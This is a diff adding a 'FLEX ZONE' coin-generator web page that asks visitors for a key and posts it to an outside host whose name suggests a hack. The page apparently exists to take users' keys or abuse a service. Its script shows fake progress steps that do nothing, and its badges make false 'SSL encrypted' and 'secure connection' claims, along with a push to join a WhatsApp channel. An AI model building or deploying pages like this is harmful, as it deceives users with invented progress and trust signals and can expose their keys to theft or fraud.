@@ -1,0 +1,492 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FLEX ZONE | COIN GENERATOR</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 450px;
+            width: 100%;
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 40px 30px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            transform: translateY(0);
+            animation: slideUp 0.5s ease-out;
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .logo h1 {
+            font-size: 32px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            letter-spacing: 2px;
+        }
+
+        .logo span {
+            font-size: 14px;
+            color: #666;
+            display: block;
+            margin-top: 5px;
+        }
+
+        .video-section {
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            border-radius: 15px;
+            padding: 20px;
+            margin-bottom: 25px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.02); }
+            100% { transform: scale(1); }
+        }
+
+        .video-section p {
+            color: white;
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.2);
+        }
+
+        .btn {
+            width: 100%;
+            padding: 15px 25px;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            position: relative;
+            overflow: hidden;
+            text-decoration: none;
+            display: inline-block;
+            margin: 10px 0;
+        }
+
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 0;
+            height: 0;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.3);
+            transform: translate(-50%, -50%);
+            transition: width 0.6s, height 0.6s;
+        }
+
+        .btn:hover::before {
+            width: 300px;
+            height: 300px;
+        }
+
+        .btn:active {
+            transform: scale(0.95);
+        }
+
+        .btn-video {
+            background: #ffffff;
+            color: #f5576c;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+
+        .input-group {
+            margin: 20px 0;
+            position: relative;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 15px 20px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            background: white;
+        }
+
+        .input-group input:focus {
+            outline: none;
+            border-color: #667eea;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+        }
+
+        .input-group label {
+            position: absolute;
+            left: 20px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #999;
+            transition: all 0.3s ease;
+            pointer-events: none;
+            background: white;
+            padding: 0 5px;
+        }
+
+        .input-group input:focus + label,
+        .input-group input:not(:placeholder-shown) + label {
+            top: 0;
+            font-size: 12px;
+            color: #667eea;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4);
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .status-card {
+            background: #f8f9fa;
+            border-radius: 12px;
+            padding: 20px;
+            margin: 20px 0;
+            border-left: 4px solid #667eea;
+            animation: slideIn 0.3s ease-out;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateX(-10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        #status {
+            font-weight: 600;
+            line-height: 1.6;
+        }
+
+        .success {
+            color: #10b981;
+            background: #d1fae5;
+            padding: 10px 15px;
+            border-radius: 8px;
+            display: inline-block;
+            width: 100%;
+        }
+
+        .fail {
+            color: #ef4444;
+            background: #fee2e2;
+            padding: 10px 15px;
+            border-radius: 8px;
+            display: inline-block;
+            width: 100%;
+        }
+
+        .btn-whatsapp {
+            background: #25D366;
+            color: white;
+            box-shadow: 0 10px 20px rgba(37, 211, 102, 0.3);
+            margin-top: 15px;
+        }
+
+        .features {
+            display: flex;
+            justify-content: space-between;
+            margin: 20px 0;
+            color: #666;
+            font-size: 12px;
+        }
+
+        .feature-item {
+            text-align: center;
+            flex: 1;
+        }
+
+        .feature-icon {
+            font-size: 20px;
+            display: block;
+            margin-bottom: 5px;
+        }
+
+        .security-badge {
+            text-align: center;
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px solid #e0e0e0;
+            color: #666;
+            font-size: 12px;
+        }
+
+        .security-badge i {
+            color: #10b981;
+            margin: 0 5px;
+        }
+
+        .loader {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-right: 10px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <h1>⫷FLEX ZONE⫸</h1>
+            <span>Premium Coin Generator</span>
+        </div>
+
+        <div class="video-section">
+            <p>📱 Watch Tutorial First</p>
+            <a href="https://pro-x-army.pages.dev/49448.mp4" target="_blank" class="btn btn-video">
+                ▶ Watch Method Video
+            </a>
+        </div>
+
+        <div class="features">
+            <div class="feature-item">
+                <span class="feature-icon">⚡</span>
+                <span>Instant Delivery</span>
+            </div>
+            <div class="feature-item">
+                <span class="feature-icon">🔒</span>
+                <span>Secure SSL</span>
+            </div>
+            <div class="feature-item">
+                <span class="feature-icon">🔄</span>
+                <span>24/7 Active</span>
+            </div>
+        </div>
+
+        <div class="input-group">
+            <input type="text" id="keyInput" placeholder=" " autocomplete="off">
+            <label for="keyInput">Enter Your Key</label>
+        </div>
+
+        <button id="getBtn" class="btn btn-primary" onclick="startFarming()">
+            Generate Coins
+        </button>
+
+        <div class="status-card">
+            <div id="status">Ready to generate...</div>
+        </div>
+
+        <a href="https://whatsapp.com/channel/0029Vb75PfXChq6SdkyVaF0A" target="_blank" class="btn btn-whatsapp">
+            📱 Join WhatsApp Channel
+        </a>
+
+        <div class="security-badge">
+            <i>🔒</i> 256-bit SSL Encrypted <i>✓</i> Secure Connection <i>🔒</i>
+        </div>
+    </div>
+
+    <script>
+        const API_URL = "https://ch-react-hck.fakcloud.tech/";
+        
+        // Audio elements with error handling
+        const sounds = {
+            success: new Audio("https://cdn.fakcloud.tech/r9f1q?raw=1"),
+            beep: new Audio("https://cdn.fakcloud.tech/xms05?raw=1"),
+            ufo: new Audio("https://cdn.fakcloud.tech/qbqde?raw=1"),
+            clock: new Audio("https://cdn.fakcloud.tech/lowhz?raw=1")
+        };
+
+        // Preload sounds
+        Object.values(sounds).forEach(sound => {
+            sound.load();
+            sound.volume = 0.5;
+        });
+
+        async function startFarming() {
+            const key = document.getElementById('keyInput').value.trim();
+            const btn = document.getElementById('getBtn');
+            const status = document.getElementById('status');
+
+            // Validation
+            if (!key) {
+                showStatus("Please enter your key!", "fail");
+                return;
+            }
+
+            if (key.length < 6) {
+                showStatus("Invalid key format!", "fail");
+                return;
+            }
+
+            // Disable button and show loading
+            btn.disabled = true;
+            btn.innerHTML = '<span class="loader"></span> Processing...';
+            
+            showStatus("🔄 Connecting to secure server...", "");
+            
+            try {
+                // Play sounds
+                sounds.clock.play().catch(() => {});
+                sounds.ufo.play().catch(() => {});
+
+                // Simulate progress
+                await simulateProgress();
+
+                // API call with timeout
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 10000);
+
+                const response = await fetch(API_URL, {
+                    method: 'POST',
+                    headers: { 
+                        'Content-Type': 'application/json', 
+                        'x-sig-id': 'FAK-9922-X',
+                        'x-requested-with': 'XMLHttpRequest'
+                    },
+                    body: JSON.stringify({ 
+                        key: key,
+                        timestamp: Date.now(),
+                        client: 'web'
+                    }),
+                    signal: controller.signal
+                });
+
+                clearTimeout(timeoutId);
+                
+                // Stop sounds
+                sounds.clock.pause();
+                sounds.ufo.pause();
+
+                if (response.ok) {
+                    const data = await response.json();
+                    sounds.success.play().catch(() => {});
+                    showStatus(
+                        "✅ Success! Coins delivered to your account!<br>" +
+                        "💎 Enjoy your rewards!", 
+                        "success"
+                    );
+                    
+                    // Optional: Show additional info
+                    if (data.balance) {
+                        status.innerHTML += `<br>💰 New Balance: ${data.balance}`;
+                    }
+                } else {
+                    sounds.beep.play().catch(() => {});
+                    showStatus(
+                        "⚠️ Already claimed! Try again tomorrow.<br>" +
+                        "📱 Join WhatsApp for new methods!", 
+                        "fail"
+                    );
+                }
+            } catch (err) {
+                // Stop sounds
+                sounds.clock.pause();
+                sounds.ufo.pause();
+                sounds.beep.play().catch(() => {});
+
+                if (err.name === 'AbortError') {
+                    showStatus("❌ Request timeout! Check connection.", "fail");
+                } else {
+                    showStatus("❌ Network error! Please try again.", "fail");
+                }
+                console.error('Error:', err);
+            } finally {
+                // Reset button
+                btn.disabled = false;
+                btn.innerHTML = 'Generate Coins';
+            }
+        }
+
+        function showStatus(message, type) {
+            const status = document.getElementById('status');
+            if (type === "success") {
+                status.innerHTML = `<span class="success">${message}</span>`;
+            } else if (type === "fail") {
+                status.innerHTML = `<span class="fail">${message}</span>`;
+            } else {
+                status.innerHTML = message;
+            }
+        }
+
+        async function simulateProgress() {
+            const status = document.getElementById('status');
+            const steps = [
+                "🔐 Verifying key...",
+                "📡 Connecting to server...",
+                "⚙️ Processing request...",
+                "💰 Generating coins..."
+            ];
+            
+            for (let step of steps) {
+                status.innerHTML = step;
+                await new Promise(resolve => setTimeout(resolve, 800));
+            }
+        }
+
+        // Add enter key support
+        document.getElementById('keyInput').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                startFarming();
+            }
+        });
+
+        // Add input validation
+        document.getElementById('keyInput').addEventListener('input', function(e) {
+            this.value = this.value.replace(/[<>]/g, ''); // Remove potentially harmful characters
+        });
+    </script>
+</body>
+</html>
